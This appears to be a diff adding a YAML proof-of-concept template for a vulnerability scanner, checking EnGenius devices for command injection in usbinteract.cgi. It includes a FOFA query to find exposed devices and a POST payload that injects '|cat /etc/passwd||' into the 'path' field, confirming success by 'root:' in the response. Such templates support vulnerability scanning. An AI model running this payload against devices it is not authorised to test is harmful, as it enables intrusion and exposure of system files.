@@ -1,0 +1,22 @@
+id: poc-yaml-engenius-usbinteract-cgi-rce
+info:
+  name: EnGenius usbinteract.cgi 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: engenius
+  fofa: body="/web/images/guest.png" && body="/web/images/admin.png"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"/web/images/guest.png") && contains(body,"/web/images/admin.png")
+- method: POST
+  path: /web/cgi-bin/usbinteract.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=7&path="|cat /etc/passwd||"
+  expression: status_code == 200 && contains(headers,"root:") && contains(headers,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
